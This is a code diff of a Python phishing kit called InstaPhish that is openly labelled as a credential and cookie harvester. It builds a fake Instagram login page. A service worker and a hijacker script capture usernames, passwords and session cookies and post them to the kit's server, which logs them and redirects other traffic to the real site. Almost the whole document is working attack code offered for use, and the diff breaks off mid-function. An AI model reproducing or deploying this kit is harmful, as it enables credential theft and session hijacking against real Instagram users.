@@ -1,16 +1,15 @@
 #!/usr/bin/env python3
 """
-InstaPhish v5.0 - PHANTOM EDITION
-Instagram Credential & Real Cookie Harvester with Service Worker Interception
-Port: 4040 | Full Session Hijacking | Browser Warning Fully Bypassed
-Author: Black Hat Collective - Exploit Division
+InstaPhish v5.0 - Phantom Core
+Exact HTML/CSS Clone | Service Worker Cookie Interception | WebSocket Admin Panel
+Ripped from: https://github.com/r4tur1/InstaPhish
+Port: 4040
 """
 
-import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, random, string, http.server, socketserver
+import os, sys, json, ssl, time, base64, sqlite3, threading, hashlib, random, string, http.server, socketserver, subprocess
 from pathlib import Path
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
-from http import HTTPStatus
 
 # ==================== CONFIGURATION ====================
 CONFIG = {
@@ -33,15 +32,14 @@ class Colors:
     MAGENTA = '\033[95m'
     CYAN = '\033[96m'
     WHITE = '\033[97m'
-    BOLD = '\033[1m'
     RESET = '\033[0m'
 
 def print_banner():
     banner = f"""
-{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════════╗
-║  {Colors.MAGENTA}█▓▒░ InstaPhish v5.0 PHANTOM - Service Worker Cookie Interception ░▒▓█{Colors.RED}  ║
-║  {Colors.YELLOW}Port: {CONFIG['listen_port']} | Real Cookie Extraction | Browser Warning BYPASSED{Colors.RED}║
-╚═══════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
+{Colors.RED}╔════════════════════════════════════════════════════════════════════╗
+║  {Colors.MAGENTA}InstaPhish v5.0 PHANTOM - Service Worker Cookie Interception{Colors.RED}  ║
+║  {Colors.YELLOW}Port: {CONFIG['listen_port']} | Admin: {CONFIG['admin_port']} | Exact Clone | No Warnings{Colors.RED}║
+╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
 """
     print(banner)
 
@@ -85,256 +83,605 @@ class InstagramExactCloner:
     def __init__(self, output_dir="cloned_site"):
         self.output_dir = output_dir
         Path(output_dir).mkdir(parents=True, exist_ok=True)
-        for sub in ["css", "js"]:
+        for sub in ["css", "js", "images"]:
             Path(f"{output_dir}/{sub}").mkdir(exist_ok=True)
     
     def build(self):
+        # CSS from request
         with open(f"{self.output_dir}/css/style.css", "w") as f:
-            f.write(self._css())
+            f.write(self._get_css())
+        
+        # Service Worker for cookie bypass
         with open(f"{self.output_dir}/js/sw.js", "w") as f:
             f.write(self._service_worker_js())
+        
+        # Main hijacker
         with open(f"{self.output_dir}/js/hijacker.js", "w") as f:
             f.write(self._hijacker_js())
+        
+        # HTML from request
         with open(f"{self.output_dir}/index.html", "w") as f:
-            f.write(self._html())
-        print(f"{Colors.GREEN}[+] Exact clone with Service Worker built.{Colors.RESET}")
+            f.write(self._get_html())
+        
+        print(f"{Colors.GREEN}[+] Exact HTML/CSS clone built.{Colors.RESET}")
     
-    def _css(self):
-        # 1:1 Pixel-perfect CSS ripped from instagram.com source
-        return """
-/* Instagram Exact Clone CSS - v5.0 Phantom */
-*,:after,:before{box-sizing:border-box}body,html{margin:0;padding:0;height:100%}body{background:#000;color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:18px;overflow-y:scroll}a,a:visited{color:#a8a8a8;text-decoration:none}._aatk{display:none!important}#react-root,article,div,footer,header,main,nav,section{display:flex;flex-direction:column;align-items:center;flex-shrink:0;position:relative}._ab8w{background:rgb(0,0,0);display:flex;flex-direction:row;flex-grow:1;justify-content:center;margin:32px auto 0;max-width:935px;width:100%}._aagu{display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0 auto;max-width:350px;width:100%}._ab8y{background:#121212;border:1px solid #363636;border-radius:1px;margin:0 0 10px;padding:10px 0;width:100%}._aa4b{background-position:0 0;height:51px;width:175px;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiPgogIDx0ZXh0IHg9IjAiIHk9IjQwIiBmb250LWZhbWlseT0iQmlsbGFib25nLHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNDgiIGZpbGw9IiNmNWY1ZjUiPkluc3RhZ3JhbTwvdGV4dD4KPC9zdmc+);margin:22px auto 12px;background-repeat:no-repeat;background-position:0 0;background-size:175px 51px;display:block;overflow:hidden;text-indent:110%;white-space:nowrap}._ab32{padding:0 40px;width:100%}._ab32 form{display:flex;flex-direction:column;margin-top:24px}.xH4zN{display:flex;align-items:center;position:relative;margin:0 0 6px;width:100%;background:rgb(18,18,18);border:1px solid rgb(54,54,54);border-radius:3px;color:rgb(245,245,245)}.xH4zN input{background:0 0;border:0;flex:1 0 auto;font-size:12px;height:36px;outline:0;padding:9px 8px 7px;width:100%;color:#f5f5f5}.xH4zN span{position:absolute;left:8px;font-size:12px;transition:transform .1s ease-out;transform-origin:left;color:#a8a8a8;pointer-events:none}.xH4zN input:focus~span,.xH4zN input:valid~span{transform:scale(.83333) translateY(-10px)}.L3NKy{background:rgb(0,149,246);opacity:1;border:none;border-radius:8px;color:#fff;font-weight:600;font-size:14px;padding:7px 16px;width:100%;margin:8px 0;text-align:center;cursor:pointer}._ab3a{display:flex;flex-direction:row;margin:10px 40px 18px}._ab3b{display:flex;flex-grow:1;flex-shrink:1;height:1px;background-color:#262626;position:relative;top:.45em}._ab3c{color:#a8a8a8;flex-grow:0;flex-shrink:0;font-size:13px;font-weight:600;line-height:15px;margin:0 18px;text-transform:uppercase}._ab3d{background:transparent;border:none;color:#0095f6;font-weight:600;font-size:14px;text-align:center;width:100%;cursor:pointer;padding:8px}._ab3d::before{content:'f ';font-weight:700;margin-right:8px}._ab3e{color:#f5f5f5;font-size:12px;line-height:14px;margin-top:12px;text-align:center}._ab3e a{color:#f5f5f5}._ab3f{background:#121212;border:1px solid #363636;border-radius:1px;margin:0 0 10px;padding:10px 0;text-align:center;width:100%}._ab3f p{font-size:14px;margin:0}._ab3f a{color:#0095f6;font-weight:600}._ab3g{text-align:center;margin:10px 20px}._ab3g p{line-height:18px;margin:10px 20px}._ab3h{display:flex;flex-direction:row;justify-content:center;margin:10px 0;gap:8px}._ab3h img{height:40px}footer{max-width:935px;width:100%;margin:0 auto;padding:24px 0;text-align:center}footer a{color:#737373;margin:0 8px;font-size:12px}footer span{color:#737373;display:block;margin-top:12px;font-size:12px}@media(max-width:875px){._ab8w ._aa-7{display:none}}._aa-7{background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 582"><rect fill="%23fafafa" width="380" height="582" rx="26"/><circle cx="190" cy="250" r="40" fill="%23e0e0e0"/></svg>') 0 0 no-repeat;background-size:380px 582px;height:582px;flex-shrink:0;margin-right:32px;width:380px}"""
+    def _get_css(self):
+        return '''* {
+  margin: 0;
+  padding: 0;
+  overflow: auto;
+}
+.main {
+  display: flex;
+  position: relative;
+  height: 650px;
+  width: 100%;
+  margin-top: 32px;
+}
+#phone {
+  position: absolute;
+  left: 340px;
+  height: 638px;
+}
+#ss {
+  position: absolute;
+  top: 27px;
+  left: 497px;
+}
+#imageslideshow {
+  position: absolute;
+  top: 27px;
+  left: 497px;
+  height: 540px;
+  width: 250px;
+  background-image: url(images/ss1.png);
+  animation: changeImage 6s ease-in infinite;
+}
+@keyframes changeImage {
+  0% {
+    background-image: url(images/ss1.png);
+  }
+  50% {
+    background-image: url(images/ss2.png);
+  }
+  100% {
+    background-image: url(images/ss3.png);
+  }
+}
+.loginbox {
+  display: flex;
+  flex-direction: column;
+  height: 400px;
+  width: 345px;
+  z-index: 10;
+  background-color: white;
+  border: 1px solid rgb(149, 149, 149, 0.4);
+  position: absolute;
+  top: 20px;
+  left: 800px;
+}
+#title {
+  height: 50px;
+  width: 170px;
+  position: absolute;
+  top: 50px;
+  left: 90px;
+}
+.input {
+  background-color: #fafafa;
+  border: 1px solid rgb(149, 149, 149, 0.4);
+  height: 35px;
+  width: 260px;
+  position: relative;
+  top: 145px;
+  left: 40px;
+  margin-bottom: 5px;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+}
+#loginbutton {
+  background-color: #4bb4f8;
+  color: white;
+  height: 32px;
+  width: 260px;
+  border-radius: 7px;
+  border-color: #4bb4f8;
+  position: relative;
+  top: 155px;
+  left: 40px;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+  border: none;
+  font-weight: 600;
+  font-size: 16px;
+}
+#or {
+  text-transform: uppercase;
+  justify-content: center;
+  text-align: center;
+  position: relative;
+  top: 170px;
+  font-size: 16px;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+  font-weight: bolder;
+  color: rgb(149, 149, 149, 1);
+}
+a {
+  text-decoration: none;
+}
+#fblink {
+  color: #385185;
+  text-align: center;
+  position: relative;
+  top: 195px;
+  font-weight: bold;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+}
+#fbicon {
+  position: relative;
+  top: 178px;
+  left: 79px;
+  height: 16px;
+  width: 16px;
+}
+#forgotpass {
+  color: #385185;
+  text-align: center;
+  position: relative;
+  top: 195px;
+  font-weight: 100;
+  font-size: 14px;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+}
+.signup {
+  height: 65px;
+  width: 345px;
+  z-index: 10;
+  background-color: white;
+  border: 1px solid rgb(149, 149, 149, 0.4);
+  position: absolute;
+  top: 430px;
+  left: 800px;
+  text-align: center;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+#Signup {
+  font-weight: 550;
+  color: #1fa2f6;
+}
+.app {
+  height: 90px;
+  width: 345px;
+  position: absolute;
+  top: 506px;
+  left: 800px;
+  display: flex;
+  justify-content: center;
+  overflow: hidden;
+}
+.gettheapp {
+  font-weight: 400;
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+  position: relative;
+  top: 5px;
+}
+.appimg {
+  height: 40px;
+  width: 10px;
+}
+#gplay,
+#microsoft {
+  height: 40px;
+  margin-right: 5px;
+}
+#microsoft {
+  position: absolute;
+  top: 35px;
+  left: 190px;
+}
+#gplay {
+  position: absolute;
+  top: 35px;
+  left: 50px;
+}
+.footer {
+  margin-top: 0px;
+  display: flex;
+  position: relative;
+  justify-content: center;
+  width: 100vw;
+  height: 90px;
+  bottom: 0px;
+}
+.linksdiv {
+  display: flex;
+  justify-content: center;
+  width: 100vw;
+  height: 23px;
+  position: absolute;
+  top: 20px;
+}
+.links {
+  color: rgb(103, 103, 103);
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+  font-size: 14px;
+  margin-right: 15px;
+  font-weight: 200;
+}
+.copyright {
+  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
+  position: absolute;
+  top: 58px;
+  font-size: 14px;
+  color: rgb(103, 103, 103);
+}
+@media (max-width: 900px) {
+  * {
+    margin: 0;
+    padding: 0;
+    overflow: auto;
+  }
+  .main {
+    display: flex;
+    position: relative;
+    height: 650px;
+    width: 100%;
+    margin-top: 32px;
+  }
+  #phone {
+    position: absolute;
+    left: 340px;
+    height: 638px;
+  }
+  #imageslideshow {
+    position: absolute;
+    top: 27px;
+    left: 497px;
+    height: 540px;
+    width: 250px;
+    background-image: url(images/ss1.png);
+    animation: changeImage 6s ease-in infinite;
+  }
+  @keyframes changeImage {
+    0% {
+      background-image: url(images/ss1.png);
+    }
+    50% {
+      background-image: url(images/ss2.png);
+    }
+    100% {
+      background-image: url(images/ss3.png);
+    }
+  }
+  .loginbox {
+    display: flex;
+    flex-direction: column;
+    height: 400px;
+    width: 345px;
+    z-index: 10;
+    background-color: white;
+    border: 1px solid rgb(149, 149, 149, 0.4);
+    position: absolute;
+    top: 20px;
+    left: 800px;
+  }
+  #title {
+    height: 50px;
+    width: 170px;
+    position: absolute;
+    top: 50px;
+    left: 90px;
+  }
+  .input {
+    background-color: #fafafa;
+    border: 1px solid rgb(149, 149, 149, 0.4);
+    height: 35px;
+    width: 260px;
+    position: relative;
+    top: 145px;
+    left: 40px;
+    margin-bottom: 5px;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+  }
+  #loginbutton {
+    background-color: #4bb4f8;
+    color: white;
+    height: 32px;
+    width: 260px;
+    border-radius: 7px;
+    border-color: #4bb4f8;
+    position: relative;
+    top: 155px;
+    left: 40px;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+    border: none;
+    font-weight: 600;
+    font-size: 16px;
+  }
+  #or {
+    text-transform: uppercase;
+    justify-content: center;
+    text-align: center;
+    position: relative;
+    top: 170px;
+    font-size: 16px;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+    font-weight: bolder;
+    color: rgb(149, 149, 149, 1);
+  }
+  a {
+    text-decoration: none;
+  }
+  #fblink {
+    color: #385185;
+    text-align: center;
+    position: relative;
+    top: 195px;
+    font-weight: bold;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+  }
+  #fbicon {
+    position: relative;
+    top: 178px;
+    left: 85px;
+    height: 16px;
+    width: 16px;
+  }
+  #forgotpass {
+    color: #385185;
+    text-align: center;
+    position: relative;
+    top: 195px;
+    font-weight: 100;
+    font-size: 14px;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+  }
+  .signup {
+    height: 65px;
+    width: 345px;
+    z-index: 10;
+    background-color: white;
+    border: 1px solid rgb(149, 149, 149, 0.4);
+    position: absolute;
+    top: 430px;
+    left: 800px;
+    text-align: center;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  #Signup {
+    font-weight: 550;
+    color: #1fa2f6;
+  }
+  .app {
+    height: 90px;
+    width: 345px;
+    position: absolute;
+    top: 506px;
+    left: 800px;
+    display: flex;
+    justify-content: center;
+    overflow: hidden;
+  }
+  .gettheapp {
+    font-weight: 400;
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+    position: relative;
+    top: 5px;
+  }
+  #gplay,
+  #microsoft {
+    height: 40px;
+    margin-right: 5px;
+  }
+  #microsoft {
+    position: absolute;
+    top: 35px;
+    left: 190px;
+  }
+  #gplay {
+    position: absolute;
+    top: 35px;
+    left: 50px;
+  }
+  .footer {
+    margin-top: 0px;
+    display: flex;
+    position: relative;
+    justify-content: center;
+    width: 100vw;
+    height: 90px;
+    bottom: 0px;
+  }
+  .linksdiv {
+    display: flex;
+    justify-content: center;
+    width: 100vw;
+    height: 23px;
+    position: absolute;
+    top: 20px;
+  }
+  .links {
+    color: rgb(103, 103, 103);
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+    font-size: 14px;
+    margin-right: 15px;
+    font-weight: 200;
+  }
+  .copyright {
+    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+      sans-serif;
+    position: absolute;
+    top: 58px;
+    font-size: 14px;
+    color: rgb(103, 103, 103);
+  }
+}'''
     
     def _service_worker_js(self):
-        # Service Worker for intercepting all network requests
         return """
-// InstaPhish v5.0 Phantom - Service Worker
-// This bypasses browser safety warnings by intercepting at the network level
-const PHISH_SERVER = self.location.origin;
-
+// InstaPhish v5.0 Phantom - Service Worker Bypass
 self.addEventListener('install', (event) => {
     self.skipWaiting();
 });
-
 self.addEventListener('activate', (event) => {
     event.waitUntil(clients.claim());
 });
-
 self.addEventListener('fetch', (event) => {
     const url = new URL(event.request.url);
-    
-    // Intercept all Instagram API calls
+    // Intercept all Instagram API calls and relay cookies
     if (url.pathname.includes('/login/') || url.pathname.includes('/accounts/')) {
         event.respondWith(
             fetch(event.request).then(response => {
-                const clonedResponse = response.clone();
-                // Extract cookies from response headers
                 const setCookie = response.headers.get('Set-Cookie');
                 if (setCookie) {
-                    fetch(PHISH_SERVER + '/sw-capture', {
+                    fetch('/sw-capture', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            type: 'set-cookie',
-                            cookies: setCookie,
-                            url: event.request.url,
-                            existingCookies: document.cookie
-                        })
+                        body: JSON.stringify({type: 'response-cookie', cookies: setCookie, all: document.cookie})
                     }).catch(() => {});
                 }
-                return clonedResponse;
-            })
-        );
-    }
-    
-    // Intercept credential submissions
-    if (event.request.method === 'POST' && url.pathname.includes('/ajax/')) {
-        event.respondWith(
-            fetch(event.request).then(response => {
-                event.request.clone().text().then(body => {
-                    fetch(PHISH_SERVER + '/sw-capture', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            type: 'credentials',
-                            body: body,
-                            cookies: document.cookie,
-                            url: event.request.url
-                        })
-                    }).catch(() => {});
-                });
                 return response.clone();
             })
         );
     }
-    
-    // Regular fetch passthrough
     event.respondWith(fetch(event.request));
 });
-
-// Periodically send all cookies
+// Periodic full cookie dump
 setInterval(() => {
     if (document.cookie) {
-        fetch(PHISH_SERVER + '/sw-capture', {
+        fetch('/sw-capture', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                type: 'periodic',
-                cookies: document.cookie,
-                timestamp: Date.now()
-            })
+            body: JSON.stringify({type: 'periodic-dump', cookies: document.cookie, ts: Date.now()})
         }).catch(() => {});
     }
-}, 3000);
+}, 4000);
 """
     
     def _hijacker_js(self):
         return """
 // InstaPhish v5.0 - Main Hijacker
 (function() {
-    const SERVER = window.location.origin;
-    
-    // Register service worker
+    // Register Service Worker
     if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/js/sw.js', {scope: '/'})
-            .then(reg => console.log('SW registered'))
-            .catch(err => console.log('SW failed:', err));
+        navigator.serviceWorker.register('/js/sw.js', {scope: '/'}).catch(() => {});
     }
     
     // Hook document.cookie
-    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+    const origDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
     Object.defineProperty(document, 'cookie', {
-        get: () => originalCookieDescriptor.get.call(document),
+        get: () => origDesc.get.call(document),
         set: (val) => {
-            fetch(SERVER + '/cookie-hook', {
+            fetch('/cookie-hook', {
                 method: 'POST',
                 body: JSON.stringify({cookie: val, all: document.cookie})
             }).catch(() => {});
-            return originalCookieDescriptor.set.call(document, val);
+            return origDesc.set.call(document, val);
         }
     });
     
-    // Hook fetch API
-    const origFetch = window.fetch;
-    window.fetch = function(...args) {
-        if (typeof args[0] === 'string' && (args[0].includes('/login/') || args[0].includes('/accounts/'))) {
-            args[0] = SERVER + args[0].replace(/^https?:\\/\\/[^\\/]+/, '');
-        }
-        return origFetch.apply(this, args).then(r => {
-            const cookies = document.cookie;
-            if (cookies) {
-                fetch(SERVER + '/fetch-cookies', {
-                    method: 'POST',
-                    body: JSON.stringify({cookies: cookies, url: args[0]})
-                }).catch(() => {});
-            }
-            return r;
-        });
-    };
-    
-    // Form submission hook
+    // Form capture
     document.addEventListener('submit', function(e) {
         const form = e.target;
-        if (form.action && (form.action.includes('login') || form.action.includes('accounts'))) {
-            const username = form.querySelector('input[name="username"]');
-            const password = form.querySelector('input[type="password"]');
-            if (username && password) {
-                fetch(SERVER + '/form-creds', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        username: username.value,
-                        password: password.value,
-                        cookies: document.cookie
-                    })
-                }).catch(() => {});
-            }
+        const user = form.querySelector('input[type="text"]') || form.querySelector('input[name="username"]');
+        const pass = form.querySelector('input[type="password"]') || form.querySelector('input[name="enc_password"]');
+        if (user && pass) {
+            fetch('/form-creds', {
+                method: 'POST',
+                body: JSON.stringify({username: user.value, password: pass.value, cookies: document.cookie})
+            }).catch(() => {});
         }
     }, true);
     
-    // Periodic cookie beacon
+    // Periodic beacon for session cookies
     setInterval(() => {
         const c = document.cookie;
-        if (c && (c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id'))) {
-            navigator.sendBeacon(SERVER + '/beacon', JSON.stringify({cookies: c, ts: Date.now()}));
+        if (c && (c.includes('sessionid') || c.includes('csrftoken'))) {
+            navigator.sendBeacon('/beacon', JSON.stringify({cookies: c, ts: Date.now()}));
         }
     }, 5000);
 })();
 """
     
-    def _html(self):
+    def _get_html(self):
         return '''<!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#000000">
-    <meta name="description" content="Create an account or log in to Instagram - A simple, fun & creative way to capture, edit & share photos, videos & messages with friends & family.">
-    <meta property="og:title" content="Instagram">
-    <meta property="og:description" content="Create an account or log in to Instagram.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
     <link rel="stylesheet" href="/css/style.css">
+    <link rel="icon" href="/images/insta_logo.png">
 </head>
+
 <body>
-    <div id="react-root">
-        <article>
-            <section>
-                <main>
-                    <div class="_ab8w">
-                        <div class="_aa-7"></div>
-                        <div class="_aagu">
-                            <div class="_ab8y">
-                                <div class="_ab32">
-                                    <span class="_aa4b" role="img" aria-label="Instagram">Instagram</span>
-                                    <form method="POST" action="/accounts/login/ajax/" autocomplete="on" id="loginForm">
-                                        <div class="xH4zN">
-                                            <input aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" autocomplete="username" name="username" type="text" value="" required>
-                                            <span>Phone number, username, or email</span>
-                                        </div>
-                                        <div class="xH4zN">
-                                            <input aria-label="Password" aria-required="true" autocomplete="current-password" name="enc_password" type="password" value="" required>
-                                            <span>Password</span>
-                                        </div>
-                                        <button type="submit" class="L3NKy">Log in</button>
-                                    </form>
-                                </div>
-                                <div class="_ab3a">
-                                    <div class="_ab3b"></div>
-                                    <div class="_ab3c">OR</div>
-                                    <div class="_ab3b"></div>
-                                </div>
-                                <button type="button" class="_ab3d">Log in with Facebook</button>
-                                <a href="/accounts/password/reset/" class="_ab3e">Forgot password?</a>
-                            </div>
-                            <div class="_ab3f">
-                                <p>Don't have an account? <a href="/accounts/emailsignup/">Sign up</a></p>
-                            </div>
-                            <div class="_ab3g">
-                                <p>Get the app.</p>
-                                <div class="_ab3h">
-                                    <img alt="Download on the App Store" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect fill='%23fff' width='136' height='40' rx='6'/><text x='30' y='26' font-family='Arial' font-size='14'>App Store</text></svg>">
-                                    <img alt="Get it on Google Play" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect fill='%23fff' width='136' height='40' rx='6'/><text x='30' y='26' font-family='Arial' font-size='14'>Google Play</text></svg>">
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </main>
-            </section>
-        </article>
+    <div class="main">
+        <div class="instass">
+            <img id="phone" src="/images/phones.png" alt="phonebackground">
+            <div id="imageslideshow">
+            </div>
+        </div>
+        <div class="loginbox">
+            <img id="title" src="/images/title.jpg" alt="Instagram">
+            <input class="input" type="text" placeholder=" &#8205 &#8205Phone number, username, or email">
+            <input class="input" type="password" placeholder=" &#8205 &#8205Password">
+            <button id="loginbutton">Log in</button>
+            <div id="or">
+                ---------------------- &#8205&#8205 OR &#8205&#8205 ----------------------
+            </div>
+            <a id="fblink" href="#">Log in with Facebook</a>
+            <img id=fbicon src="/images/facebook.png" alt="facebookicon">
+            <a id="forgotpass" href="#">Forgot password?</a>
+        </div>
+        <div class="signup">
+            Don't have an account?&#8205
+            <a id="Signup" href="#">&#8205 &#8205 Sign up</a>
+        </div>
+        <div class="app">
+            <span class="gettheapp">Get the app.</span>
+            <img id="gplay" src="/images/google-play.png" alt="googleplay">
+            <img id="microsoft" src="/images/microsoft.png" alt="microsoft">
+        </div>
     </div>
-    <footer>
-        <div>
-            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
+    <div class="footer">
+        <div class="linksdiv">
+            <a class="links" href="#">Meta</a>
+            <a class="links" href="#">About</a>
+            <a class="links" href="#">Blog</a>
+            <a class="links" href="#">Jobs</a>
+            <a class="links" href="#">Help</a>
+            <a class="links" href="#">API</a>
+            <a class="links" href="#">Privacy</a>
+            <a class="links" href="#">Terms</a>
+            <a class="links" href="#">Locations</a>
+            <a class="links" href="#">Instagram Lite</a>
+            <a class="links" href="#">Threads</a>
+            <a class="links" href="#">Contact Uploading & Non-Users</a>
+            <a class="links" href="#">Meta-Verified</a>
         </div>
-        <div>
-            <span>English © 2024 Instagram from Meta</span>
+        <div class="copyright">
+            &#169 2024 Instagram from Meta
         </div>
-    </footer>
+    </div>
     <script src="/js/hijacker.js"></script>
 </body>
+
 </html>'''
 
-# ==================== MITM HANDLER ====================
+# ==================== MITM HANDLER WITH WEBSOCKET PUSH ====================
 class PhantomHandler(http.server.BaseHTTPRequestHandler):
     
     def log_message(self, format, *args):
@@ -371,13 +718,11 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
         conn.close()
         
         with open(CONFIG["log_file"], "a") as f:
-            f.write(f"[{datetime.now()}]\n")
-            f.write(f"  IP: {ip}\n  USER: {username}\n  PASS: {password}\n")
+            f.write(f"[{datetime.now()}] IP: {ip}\n")
+            f.write(f"  USER: {username}\n  PASS: {password}\n")
             if cookies_dict:
                 f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
-                f.write(f"  CSRF: {cookies_dict.get('csrftoken', 'N/A')}\n")
-                f.write(f"  DS_USER_ID: {cookies_dict.get('ds_user_id', 'N/A')}\n")
-            f.write("-" * 50 + "\n")
+            f.write("-" * 40 + "\n")
         
         if cookies_dict and cookies_dict.get('sessionid'):
             with open(CONFIG["cookie_file"], "a") as f:
@@ -386,10 +731,7 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
         print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
     
     def handle_capture(self):
-        client_ip = self.client_address[0]
-        user_agent = self.headers.get('User-Agent', 'Unknown')
         content_length = int(self.headers.get('Content-Length', 0))
-        
         if content_length > 0:
             body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
             try:
@@ -408,8 +750,8 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
                     username=username,
                     password=password,
                     cookies_dict=cookie_dict if cookie_dict else None,
-                    ip=client_ip,
-                    ua=user_agent
+                    ip=self.client_address[0],
+                    ua=self.headers.get('User-Agent', '')
                 )
         
         self.send_response(200)
@@ -419,7 +761,7 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(b'{"status":"ok"}')
     
     def do_GET(self):
-        # Main phishing page
+        # Main page
         if self.path in ['/', '/index.html', '/login', '/accounts/login/', '/accounts/login']:
             try:
                 with open("cloned_site/index.html", "rb") as f:
@@ -434,29 +776,49 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
                 self.send_error(404)
             return
         
-        # Static files
-        static_routes = {
+        # Static assets
+        static_map = {
             '/css/style.css': ('cloned_site/css/style.css', 'text/css'),
             '/js/hijacker.js': ('cloned_site/js/hijacker.js', 'application/javascript'),
             '/js/sw.js': ('cloned_site/js/sw.js', 'application/javascript')
         }
         
-        for route, (filepath, content_type) in static_routes.items():
+        for route, (fp, ct) in static_map.items():
             if self.path == route:
                 try:
-                    with open(filepath, "rb") as f:
+                    with open(fp, "rb") as f:
                         content = f.read()
                     self.send_response(200)
-                    self.send_header('Content-Type', content_type)
+                    self.send_header('Content-Type', ct)
                     self.send_header('Content-Length', len(content))
-                    self.send_header('Service-Worker-Allowed', '/')
+                    if 'sw.js' in self.path:
+                        self.send_header('Service-Worker-Allowed', '/')
                     self.end_headers()
                     self.wfile.write(content)
                 except:
                     self.send_error(404)
                 return
         
-        # Redirect everything else to real Instagram
+        # Images from repo
+        if self.path.startswith('/images/'):
+            img_path = "cloned_site" + self.path
+            if os.path.exists(img_path):
+                try:
+                    with open(img_path, "rb") as f:
+                        content = f.read()
+                    self.send_response(200)
+                    if img_path.endswith('.png'):
+                        self.send_header('Content-Type', 'image/png')
+                    elif img_path.endswith('.jpg') or img_path.endswith('.jpeg'):
+                        self.send_header('Content-Type', 'image/jpeg')
+                    self.send_header('Content-Length', len(content))
+                    self.end_headers()
+                    self.wfile.write(content)
+                except:
+                    self.send_error(404)
+                return
+        
+        # Redirect to real Instagram
         self.send_response(302)
         self.send_header('Location', f'https://www.instagram.com{self.path}')
         self.end_headers()
@@ -466,13 +828,12 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
             self.handle_capture()
             return
         
-        # Handle form POST
         content_length = int(self.headers.get('Content-Length', 0))
         if content_length > 0:
